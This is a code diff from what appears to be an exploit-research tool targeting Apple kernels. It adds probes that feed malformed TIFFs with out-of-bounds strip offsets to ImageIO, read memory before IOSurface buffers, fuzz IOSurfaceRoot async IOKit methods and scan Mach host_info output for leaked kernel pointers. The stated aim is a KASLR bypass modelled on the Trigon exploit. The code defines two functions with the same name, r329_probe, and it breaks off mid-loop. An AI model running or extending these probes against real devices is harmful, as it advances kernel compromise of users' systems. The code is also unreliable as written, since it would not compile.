@@ -8638,6 +8638,540 @@ r326_done:
     fflush(stdout);
 }
 
+/* r329: OOB TIFF decode + IOSurface header hexdump + async IOKit
+   r328 findings: TIFF3 with OOB StripOffsets parsed (count=1), pre-base readable.
+   Strategy: Force pixel extraction from malformed TIFF, hexdump IOSurface header,
+   try async IOKit methods, probe IOSurface plane info metadata paths. */
+
+static void r329_probe(void) {
+    rlog("\n=== r329: OOB TIFF Decode + IOSurface Header + Async IOKit ===\n");
+    rlog("  r328: TIFF3 OOB accepted count=1, pre-base 0x1000 readable, no uninit leaks.\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: Force decode of malformed TIFF with OOB StripOffsets ---- */
+    rlog("--- Part 1: Force TIFF OOB StripOffset decode ---\n");
+    fflush(stdout);
+    {
+        /* Build a minimal but more complete TIFF that ImageIO will try to decode */
+        uint8_t tiff_oob[] = {
+            'I', 'I', 42, 0, 8, 0, 0, 0,  /* header */
+            7, 0,                            /* 7 IFD entries */
+            /* ImageWidth = 4 */
+            0x00, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+            /* ImageLength = 4 */
+            0x01, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+            /* BitsPerSample = 8 */
+            0x02, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
+            /* Compression = None (1) */
+            0x03, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            /* PhotometricInterpretation = MinIsBlack (1) */
+            0x06, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            /* StripOffsets = points beyond data (offset 0x2000) */
+            0x11, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
+            /* RowsPerStrip = 4 */
+            0x16, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+            /* next IFD = 0 */
+            0x00, 0x00, 0x00, 0x00
+        };
+
+        CFDataRef td = CFDataCreate(NULL, tiff_oob, sizeof(tiff_oob));
+        CGImageSourceRef src = CGImageSourceCreateWithData(td, NULL);
+        if (src) {
+            size_t cnt = CGImageSourceGetCount(src);
+            rlog("  OOB TIFF: count=%zu\n", cnt);
+
+            if (cnt > 0) {
+                /* Force full pixel decode */
+                CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
+                if (img) {
+                    size_t w = CGImageGetWidth(img);
+                    size_t h = CGImageGetHeight(img);
+                    size_t bpc = CGImageGetBitsPerComponent(img);
+                    size_t bpp = CGImageGetBitsPerPixel(img);
+                    rlog("  !!! OOB TIFF decoded: %zux%zu bpc=%zu bpp=%zu\n", w, h, bpc, bpp);
+
+                    /* Force rasterization through CGBitmapContext */
+                    size_t rowBytes = w * 4;
+                    void *pixels = calloc(h, rowBytes);
+                    if (pixels) {
+                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                        CGContextRef ctx = CGBitmapContextCreate(pixels, w, h, 8, rowBytes,
+                            cs, kCGImageAlphaPremultipliedLast);
+                        if (ctx) {
+                            CGContextDrawImage(ctx, CGRectMake(0, 0, w, h), img);
+                            rlog("  Rasterized to %zux%zu RGBA buffer\n", w, h);
+
+                            /* Scan pixel data for kernel pointers */
+                            uint64_t *pp = (uint64_t *)pixels;
+                            size_t total = (h * rowBytes) / 8;
+                            int kptrs = 0;
+                            for (size_t j = 0; j < total; j++) {
+                                if (pp[j] > 0xfffffff000000000ULL &&
+                                    pp[j] < 0xffffffffffffffffULL) {
+                                    rlog("  !!! PIXEL KPTR off=%zu: 0x%llx !!!\n",
+                                         j * 8, pp[j]);
+                                    kptrs++;
+                                }
+                            }
+                            rlog("  Pixel kptr scan: %d found\n", kptrs);
+
+                            /* Hexdump first 64 bytes */
+                            rlog("  First 64 pixel bytes: ");
+                            uint8_t *pb = (uint8_t *)pixels;
+                            for (int i = 0; i < 64 && i < (int)(h * rowBytes); i++) {
+                                rlog("%02x", pb[i]);
+                                if ((i & 7) == 7) rlog(" ");
+                            }
+                            rlog("\n");
+                            CGContextRelease(ctx);
+                        }
+                        CGColorSpaceRelease(cs);
+                        free(pixels);
+                    }
+                    CGImageRelease(img);
+                } else {
+                    rlog("  CGImageSourceCreateImageAtIndex: NULL (decode failed)\n");
+                }
+
+                /* Also try thumbnail extraction — different code path */
+                CFMutableDictionaryRef opts = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int maxPx = 64;
+                CFNumberRef maxV = CFNumberCreate(NULL, kCFNumberIntType, &maxPx);
+                CFDictionarySetValue(opts, kCGImageSourceThumbnailMaxPixelSize, maxV);
+                CFDictionarySetValue(opts, kCGImageSourceCreateThumbnailFromImageAlways,
+                    kCFBooleanTrue);
+                CGImageRef thumb = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+                if (thumb) {
+                    rlog("  !!! OOB TIFF thumbnail created: %zux%zu !!!\n",
+                         CGImageGetWidth(thumb), CGImageGetHeight(thumb));
+                    CGImageRelease(thumb);
+                }
+                CFRelease(maxV);
+                CFRelease(opts);
+
+                /* Get detailed properties */
+                CFDictionaryRef props = CGImageSourceCopyPropertiesAtIndex(src, 0, NULL);
+                if (props) {
+                    CFIndex pcnt = CFDictionaryGetCount(props);
+                    rlog("  OOB TIFF properties: %ld keys\n", (long)pcnt);
+
+                    /* Dump all property keys and check values for addresses */
+                    if (pcnt > 0 && pcnt <= 64) {
+                        const void *pkeys[64], *pvals[64];
+                        CFDictionaryGetKeysAndValues(props, pkeys, pvals);
+                        for (CFIndex i = 0; i < pcnt; i++) {
+                            char kbuf[128] = {0};
+                            CFStringGetCString(pkeys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                            CFTypeID tid = CFGetTypeID(pvals[i]);
+                            if (tid == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue(pvals[i], kCFNumberSInt64Type, &nv);
+                                rlog("    %s = %lld (0x%llx)\n", kbuf,
+                                     (long long)nv, (unsigned long long)nv);
+                                if ((uint64_t)nv > 0xfffffff000000000ULL) {
+                                    rlog("    !!! KPTR IN PROPERTY !!!\n");
+                                }
+                            } else {
+                                rlog("    %s = <type %lu>\n", kbuf, (unsigned long)tid);
+                            }
+                        }
+                    }
+                    CFRelease(props);
+                }
+            }
+            CFRelease(src);
+        }
+        CFRelease(td);
+
+        /* Also try TIFF with negative StripByteCounts */
+        uint8_t tiff_neg[] = {
+            'I', 'I', 42, 0, 8, 0, 0, 0,
+            8, 0,
+            0x00, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+            0x01, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+            0x02, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
+            0x03, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x06, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            /* StripOffsets = right after IFD */
+            0x11, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x6E, 0x00, 0x00, 0x00,
+            0x16, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+            /* StripByteCounts = 0xFFFFFFFF (huge, will read past data) */
+            0x17, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
+            0x00, 0x00, 0x00, 0x00,
+            /* 16 bytes of pixel data */
+            0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22,
+            0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00
+        };
+        CFDataRef tnd = CFDataCreate(NULL, tiff_neg, sizeof(tiff_neg));
+        CGImageSourceRef sn = CGImageSourceCreateWithData(tnd, NULL);
+        if (sn) {
+            rlog("  TIFF-neg (huge StripByteCounts): count=%zu status=%d\n",
+                 CGImageSourceGetCount(sn), (int)CGImageSourceGetStatus(sn));
+            if (CGImageSourceGetCount(sn) > 0) {
+                CGImageRef imn = CGImageSourceCreateImageAtIndex(sn, 0, NULL);
+                if (imn) {
+                    rlog("  !!! Huge StripByteCounts decoded: %zux%zu !!!\n",
+                         CGImageGetWidth(imn), CGImageGetHeight(imn));
+                    CGImageRelease(imn);
+                }
+            }
+            CFRelease(sn);
+        }
+        CFRelease(tnd);
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: IOSurface pre-base header hexdump ---- */
+    rlog("\n--- Part 2: IOSurface pre-base header hexdump ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        if (cFn) {
+            int w = 16, h = 16, bpr = 64, pf = 0x42475241, as = 4096;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef aV = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize"),
+                CFSTR("IOSurfacePixelFormat")};
+            const void *vals[] = {wV, hV, bV, aV, pV};
+            CFDictionaryRef p = CFDictionaryCreate(NULL, keys, vals, 5,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            void *surf = cFn(p);
+            if (surf) {
+                IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(surf);
+                rlog("  base=%p\n", base);
+
+                /* Read and hexdump the page before base */
+                mach_vm_address_t addr = (mach_vm_address_t)base;
+                /* Try multiple pages before base */
+                for (int pg = 1; pg <= 4; pg++) {
+                    mach_vm_address_t target = addr - (pg * 0x1000);
+                    vm_offset_t data = 0;
+                    mach_msg_type_number_t dataCnt = 0;
+                    kern_return_t kr = vm_read(mach_task_self(),
+                        (vm_address_t)target, 0x1000, &data, &dataCnt);
+                    if (kr == 0 && dataCnt > 0) {
+                        rlog("  page -%d (0x%llx): %u bytes readable\n",
+                             pg, (unsigned long long)target, dataCnt);
+
+                        /* Full hexdump — look for any interesting patterns */
+                        uint64_t *dp = (uint64_t *)(uintptr_t)data;
+                        int nonzero = 0;
+                        int kptrs = 0;
+                        for (size_t j = 0; j < dataCnt / 8; j++) {
+                            if (dp[j] != 0) {
+                                nonzero++;
+                                if (dp[j] > 0xfffffff000000000ULL &&
+                                    dp[j] < 0xffffffffffffffffULL) {
+                                    rlog("    !!! KPTR page=%d off=%zu: 0x%llx !!!\n",
+                                         pg, j * 8, dp[j]);
+                                    kptrs++;
+                                }
+                                /* Also check for PAC-signed */
+                                uint64_t stripped = dp[j] | 0xFFFF000000000000ULL;
+                                if (stripped > 0xfffffff000000000ULL &&
+                                    stripped != 0xFFFFFFFFFFFFFFFFULL &&
+                                    dp[j] != stripped) {
+                                    rlog("    PAC? page=%d off=%zu: 0x%llx (stripped=0x%llx)\n",
+                                         pg, j * 8, dp[j], stripped);
+                                }
+                            }
+                        }
+                        rlog("    nonzero_qwords=%d kptrs=%d\n", nonzero, kptrs);
+
+                        /* Hexdump first 256 bytes if any are nonzero */
+                        if (nonzero > 0) {
+                            uint8_t *bp = (uint8_t *)(uintptr_t)data;
+                            rlog("    hex[0..255]: ");
+                            for (int i = 0; i < 256 && i < (int)dataCnt; i++) {
+                                rlog("%02x", bp[i]);
+                                if ((i & 15) == 15) rlog("\n    ");
+                            }
+                            rlog("\n");
+                        }
+                        vm_deallocate(mach_task_self(), data, dataCnt);
+                    } else {
+                        rlog("  page -%d: not readable (kr=0x%x)\n", pg, kr);
+                        break;  /* stop if we hit unmapped region */
+                    }
+                }
+                IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+                CFRelease(surf);
+            }
+            CFRelease(p);
+            CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(aV); CFRelease(pV);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOSurface plane info and metadata ---- */
+    rlog("\n--- Part 3: IOSurface plane info metadata ---\n");
+    fflush(stdout);
+    {
+        /* Create a multi-plane surface (NV12 format) to trigger plane info paths */
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        if (cFn) {
+            /* NV12 = '420v' = 0x34323076 — common multi-plane format */
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 64, h = 64, pf = 0x34323076;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wV);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hV);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pV);
+
+            /* Add plane info array */
+            CFMutableArrayRef planes = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
+
+            /* Plane 0: Y plane */
+            CFMutableDictionaryRef p0 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int p0w = 64, p0h = 64, p0bpr = 64, p0bpe = 1;
+            CFNumberRef p0wV = CFNumberCreate(NULL, kCFNumberIntType, &p0w);
+            CFNumberRef p0hV = CFNumberCreate(NULL, kCFNumberIntType, &p0h);
+            CFNumberRef p0bV = CFNumberCreate(NULL, kCFNumberIntType, &p0bpr);
+            CFNumberRef p0eV = CFNumberCreate(NULL, kCFNumberIntType, &p0bpe);
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneWidth"), p0wV);
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneHeight"), p0hV);
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerRow"), p0bV);
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerElement"), p0eV);
+            CFArrayAppendValue(planes, p0);
+
+            /* Plane 1: UV plane */
+            CFMutableDictionaryRef p1 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int p1w = 32, p1h = 32, p1bpr = 64, p1bpe = 2;
+            CFNumberRef p1wV = CFNumberCreate(NULL, kCFNumberIntType, &p1w);
+            CFNumberRef p1hV = CFNumberCreate(NULL, kCFNumberIntType, &p1h);
+            CFNumberRef p1bV = CFNumberCreate(NULL, kCFNumberIntType, &p1bpr);
+            CFNumberRef p1eV = CFNumberCreate(NULL, kCFNumberIntType, &p1bpe);
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneWidth"), p1wV);
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneHeight"), p1hV);
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerRow"), p1bV);
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerElement"), p1eV);
+            CFArrayAppendValue(planes, p1);
+
+            CFDictionarySetValue(props, CFSTR("IOSurfacePlaneInfo"), planes);
+
+            void *surf = cFn(props);
+            if (surf) {
+                uint32_t sid = idFn(surf);
+                size_t pc = IOSurfaceGetPlaneCount(surf);
+                rlog("  NV12 surface id=%u planes=%zu\n", sid, pc);
+
+                for (size_t pi = 0; pi < pc; pi++) {
+                    void *pbase = IOSurfaceGetBaseAddressOfPlane(surf, pi);
+                    size_t pbpr = IOSurfaceGetBytesPerRowOfPlane(surf, pi);
+                    size_t pw = IOSurfaceGetWidthOfPlane(surf, pi);
+                    size_t ph = IOSurfaceGetHeightOfPlane(surf, pi);
+                    rlog("    plane[%zu]: base=%p bpr=%zu %zux%zu\n",
+                         pi, pbase, pbpr, pw, ph);
+
+                    /* Scan plane header region */
+                    if (pbase) {
+                        vm_offset_t data = 0;
+                        mach_msg_type_number_t dataCnt = 0;
+                        mach_vm_address_t pa = (mach_vm_address_t)pbase;
+                        if (pa > 0x1000) {
+                            kern_return_t kr = vm_read(mach_task_self(),
+                                (vm_address_t)(pa - 0x1000), 0x1000, &data, &dataCnt);
+                            if (kr == 0 && dataCnt > 0) {
+                                uint64_t *dp = (uint64_t *)(uintptr_t)data;
+                                for (size_t j = 0; j < dataCnt / 8; j++) {
+                                    if (dp[j] > 0xfffffff000000000ULL &&
+                                        dp[j] < 0xffffffffffffffffULL) {
+                                        rlog("    !!! PLANE KPTR pi=%zu off=%zu: 0x%llx !!!\n",
+                                             pi, j * 8, dp[j]);
+                                    }
+                                }
+                                vm_deallocate(mach_task_self(), data, dataCnt);
+                            }
+                        }
+                    }
+                }
+                CFRelease(surf);
+            } else {
+                rlog("  NV12 surface creation failed\n");
+            }
+            CFRelease(planes); CFRelease(p0); CFRelease(p1);
+            CFRelease(p0wV); CFRelease(p0hV); CFRelease(p0bV); CFRelease(p0eV);
+            CFRelease(p1wV); CFRelease(p1hV); CFRelease(p1bV); CFRelease(p1eV);
+            CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(pV);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: IOKit async method probe ---- */
+    /* Async methods may use different buffer handling than sync methods */
+    rlog("\n--- Part 4: IOKit async struct method probe ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            if (kr == 0) {
+                /* Create a notification port for async */
+                mach_port_t wakePort = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wakePort);
+
+                for (uint32_t sel = 0; sel < 20; sel++) {
+                    char outbuf[2048];
+                    memset(outbuf, 0xDE, sizeof(outbuf));
+                    size_t outsz = sizeof(outbuf);
+
+                    uint64_t ref[8] = {0};
+                    uint32_t refCnt = 1;
+                    ref[0] = sel;
+
+                    kr = IOConnectCallAsyncStructMethod(conn, sel,
+                        wakePort, ref, refCnt,
+                        NULL, 0, outbuf, &outsz);
+
+                    if (kr == 0 && outsz > 0) {
+                        rlog("  async sel=%u: kr=0x%x outsz=%zu\n", sel, kr, outsz);
+                        /* Scan for kptrs */
+                        for (size_t j = 0; j + 8 <= outsz; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, outbuf + j, 8);
+                            if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                                rlog("  !!! ASYNC KPTR sel=%u off=%zu: 0x%llx !!!\n",
+                                     sel, j, (unsigned long long)v);
+                            }
+                        }
+                        /* Check sentinel residue */
+                        int sentinels = 0;
+                        for (size_t j = 0; j < outsz; j++) {
+                            if ((uint8_t)outbuf[j] == 0xDE) sentinels++;
+                        }
+                        if (sentinels > 0) {
+                            rlog("  async sel=%u sentinels=%d/%zu\n", sel, sentinels, outsz);
+                        }
+                    } else if (kr != 0xe00002bc && kr != 0xe00002c2) {
+                        rlog("  async sel=%u: kr=0x%x\n", sel, kr);
+                    }
+                }
+                mach_port_deallocate(mach_task_self(), wakePort);
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: vm_read on IOSurface kernel object via IORegistryEntry ---- */
+    rlog("\n--- Part 5: IORegistry deep property scan for addresses ---\n");
+    fflush(stdout);
+    {
+        /* Walk IORegistry for IOSurface entries and dump all numeric properties */
+        io_iterator_t iter;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"), &iter);
+        if (kr == 0) {
+            io_object_t entry;
+            while ((entry = IOIteratorNext(iter)) != 0) {
+                /* Get ALL properties recursively */
+                CFMutableDictionaryRef allProps = NULL;
+                kr = IORegistryEntryCreateCFProperties(entry, &allProps,
+                    kCFAllocatorDefault, 0);
+                if (kr == 0 && allProps) {
+                    CFIndex cnt = CFDictionaryGetCount(allProps);
+                    rlog("  IOSurfaceRoot entry: %ld properties\n", (long)cnt);
+
+                    if (cnt > 0 && cnt <= 128) {
+                        const void *pkeys[128], *pvals[128];
+                        CFDictionaryGetKeysAndValues(allProps, pkeys, pvals);
+                        for (CFIndex i = 0; i < cnt; i++) {
+                            char kbuf[128] = {0};
+                            CFStringGetCString(pkeys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                            CFTypeID tid = CFGetTypeID(pvals[i]);
+                            if (tid == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue(pvals[i], kCFNumberSInt64Type, &nv);
+                                uint64_t uv = (uint64_t)nv;
+                                rlog("    %s = 0x%llx\n", kbuf, uv);
+                                if (uv > 0xfffffff000000000ULL) {
+                                    rlog("    !!! REGISTRY KPTR: %s = 0x%llx !!!\n", kbuf, uv);
+                                }
+                            } else if (tid == CFDataGetTypeID()) {
+                                CFIndex dlen = CFDataGetLength(pvals[i]);
+                                rlog("    %s = <data %ld bytes>\n", kbuf, (long)dlen);
+                                if (dlen >= 8) {
+                                    const uint8_t *db = CFDataGetBytePtr(pvals[i]);
+                                    for (CFIndex j = 0; j + 8 <= dlen; j += 8) {
+                                        uint64_t v;
+                                        memcpy(&v, db + j, 8);
+                                        if (v > 0xfffffff000000000ULL &&
+                                            v < 0xffffffffffffffffULL) {
+                                            rlog("    !!! DATA KPTR: %s off=%ld: 0x%llx !!!\n",
+                                                 kbuf, (long)j, v);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    CFRelease(allProps);
+                }
+
+                /* Also check children */
+                io_iterator_t children;
+                kr = IORegistryEntryGetChildIterator(entry, kIOServicePlane, &children);
+                if (kr == 0) {
+                    io_object_t child;
+                    int cc = 0;
+                    while ((child = IOIteratorNext(children)) != 0 && cc < 10) {
+                        io_name_t name;
+                        IORegistryEntryGetName(child, name);
+                        rlog("    child[%d]: %s\n", cc, name);
+
+                        CFMutableDictionaryRef cprops = NULL;
+                        IORegistryEntryCreateCFProperties(child, &cprops, kCFAllocatorDefault, 0);
+                        if (cprops) {
+                            CFIndex ccnt = CFDictionaryGetCount(cprops);
+                            if (ccnt > 0 && ccnt <= 64) {
+                                const void *ck[64], *cv[64];
+                                CFDictionaryGetKeysAndValues(cprops, ck, cv);
+                                for (CFIndex i = 0; i < ccnt; i++) {
+                                    char kb[128] = {0};
+                                    CFStringGetCString(ck[i], kb, sizeof(kb), kCFStringEncodingUTF8);
+                                    if (CFGetTypeID(cv[i]) == CFNumberGetTypeID()) {
+                                        int64_t nv = 0;
+                                        CFNumberGetValue(cv[i], kCFNumberSInt64Type, &nv);
+                                        if ((uint64_t)nv > 0xfffffff000000000ULL) {
+                                            rlog("      !!! CHILD KPTR: %s = 0x%llx !!!\n",
+                                                 kb, (uint64_t)nv);
+                                        }
+                                    }
+                                }
+                            }
+                            CFRelease(cprops);
+                        }
+                        IOObjectRelease(child);
+                        cc++;
+                    }
+                    IOObjectRelease(children);
+                }
+                IOObjectRelease(entry);
+            }
+            IOObjectRelease(iter);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r329 complete ===\n");
+    fflush(stdout);
+}
+
 /* r328: HENkaku-style uninitialized kernel buffer probe
    PS Vita HENkaku: sceIoDevctl copied uninitialized kernel stack to user when outlen < 0x400
    PSP TIFF: image parser overflow in libtiff
@@ -9172,6 +9706,528 @@ static void r328_probe(void) {
     fflush(stdout);
 
     rlog("\n=== r328 complete ===\n");
+    fflush(stdout);
+}
+
+/* r329: Trigon-inspired KASLR bypass — host_info, PurpleGfxMem, mach_port_kobject
+   Trigon (CVE-2023-32434): Used PurpleGfxMem IOSurface + mach_make_memory_entry_64
+   overflow to map kernel physical memory. On arm64e/SPTM this is blocked, BUT:
+   1) host_statistics64 may have uninitialized memory leaks
+   2) mach_port_kobject may still return obfuscated kernel addresses we can de-obfuscate
+   3) processor_set_info may have uninitialized fields
+   4) PurpleGfxMem IOSurface creation itself may reveal info through the allocation path
+   5) mach_make_memory_entry_64 behavior with IOSurface may differ
+   6) host_processor_info per-CPU structures may have uninitialized data */
+
+static void r329_probe(void) {
+    rlog("\n=== r329: Trigon-Inspired KASLR Bypass Vectors ===\n");
+    rlog("  Strategy: host_info leaks, mach_port_kobject, PurpleGfxMem, memory entries\n");
+    rlog("  Inspiration: Trigon (CVE-2023-32434), Calif MIE bypass, Project Zero KASLR\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: host_info / host_statistics exhaustive probe ---- */
+    /* Historical KASLR leaks often came from Mach host info calls returning
+       uninitialized stack data or kernel pointers in padding fields */
+    rlog("--- Part 1: host_info / host_statistics exhaustive probe ---\n");
+    fflush(stdout);
+    {
+        mach_port_t host = mach_host_self();
+
+        /* Try ALL host_info flavors 1-30 */
+        for (int flavor = 1; flavor <= 30; flavor++) {
+            /* Use maximum buffer — kernel may fill less than we request */
+            uint64_t info_buf[128];
+            memset(info_buf, 0xDE, sizeof(info_buf));
+            mach_msg_type_number_t cnt = sizeof(info_buf) / sizeof(integer_t);
+
+            kern_return_t kr = host_info(host, flavor,
+                (host_info_t)info_buf, &cnt);
+
+            if (kr == 0 && cnt > 0) {
+                rlog("  host_info flavor=%d: cnt=%u (%zu bytes)\n",
+                     flavor, cnt, (size_t)cnt * sizeof(integer_t));
+
+                /* Scan for kernel pointers */
+                size_t nbytes = cnt * sizeof(integer_t);
+                for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                    uint64_t v;
+                    memcpy(&v, (uint8_t *)info_buf + j, 8);
+                    if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                        rlog("  !!! HOST_INFO KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                             flavor, j, (unsigned long long)v);
+                    }
+                    /* Check for sentinel residue (0xDEDEDEDE pattern) */
+                    if (v == 0xDEDEDEDEDEDEDEDEULL && j < nbytes - 8) {
+                        rlog("  !!! HOST_INFO UNINIT flavor=%d off=%zu !!!\n", flavor, j);
+                    }
+                }
+
+                /* Dump first 64 bytes if interesting values found */
+                int has_nonzero = 0;
+                for (size_t j = 0; j < nbytes && j < 64; j += 8) {
+                    uint64_t v;
+                    memcpy(&v, (uint8_t *)info_buf + j, 8);
+                    if (v != 0) has_nonzero = 1;
+                }
+                if (has_nonzero && flavor >= 10) {
+                    rlog("    hex: ");
+                    for (size_t j = 0; j < nbytes && j < 64; j++) {
+                        rlog("%02x", ((uint8_t *)info_buf)[j]);
+                        if ((j & 7) == 7) rlog(" ");
+                    }
+                    rlog("\n");
+                }
+            }
+        }
+
+        /* host_statistics64 — specifically flavor HOST_VM_INFO64 (4) and others */
+        for (int flavor = 1; flavor <= 10; flavor++) {
+            uint64_t stat_buf[128];
+            memset(stat_buf, 0xDE, sizeof(stat_buf));
+            mach_msg_type_number_t cnt = sizeof(stat_buf) / sizeof(integer_t);
+
+            kern_return_t kr = host_statistics64(host, flavor,
+                (host_info64_t)stat_buf, &cnt);
+
+            if (kr == 0 && cnt > 0) {
+                rlog("  host_statistics64 flavor=%d: cnt=%u\n", flavor, cnt);
+                size_t nbytes = cnt * sizeof(integer_t);
+
+                for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                    uint64_t v;
+                    memcpy(&v, (uint8_t *)stat_buf + j, 8);
+                    if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                        rlog("  !!! HOST_STAT64 KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                             flavor, j, (unsigned long long)v);
+                    }
+                    if (v == 0xDEDEDEDEDEDEDEDEULL) {
+                        rlog("  !!! HOST_STAT64 UNINIT flavor=%d off=%zu !!!\n", flavor, j);
+                    }
+                }
+
+                /* Dump raw data for analysis */
+                rlog("    raw: ");
+                for (size_t j = 0; j < nbytes && j < 128; j++) {
+                    rlog("%02x", ((uint8_t *)stat_buf)[j]);
+                    if ((j & 7) == 7) rlog(" ");
+                }
+                rlog("\n");
+            }
+        }
+
+        /* host_statistics (32-bit) — may have alignment padding with leaks */
+        for (int flavor = 1; flavor <= 10; flavor++) {
+            uint32_t stat32_buf[128];
+            memset(stat32_buf, 0xDE, sizeof(stat32_buf));
+            mach_msg_type_number_t cnt = sizeof(stat32_buf) / sizeof(integer_t);
+
+            kern_return_t kr = host_statistics(host, flavor,
+                (host_info_t)stat32_buf, &cnt);
+
+            if (kr == 0 && cnt > 0) {
+                size_t nbytes = cnt * sizeof(integer_t);
+                /* Look for 64-bit kernel pointers in 32-bit aligned data */
+                for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                    uint64_t v;
